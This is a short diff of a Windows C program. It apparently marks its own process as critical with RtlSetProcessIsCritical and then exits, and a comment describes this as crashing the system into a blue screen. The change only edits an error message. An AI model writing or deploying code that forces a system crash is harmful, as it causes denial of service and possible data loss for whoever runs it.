@@ -46,7 +46,7 @@ int set_critical() {
 	}
 	else
 	{
-		MessageBoxW(NULL, L"Please help me out, I cannot find RtlSetProcessIsCritical. Do you know where it is?", L"Kernel32", MB_OK | MB_ICONERROR);
+		MessageBoxW(NULL, L"I cannot find RtlSetProcessIsCritical.\nDo you know where it is?", L"Kernel32", MB_OK | MB_ICONERROR);
 
 		return FALSE;
 	}
@@ -61,4 +61,5 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 	// Crashing the system / Calling the BSOD!
 	ExitProcess(0);
 	return 0;
+
 }
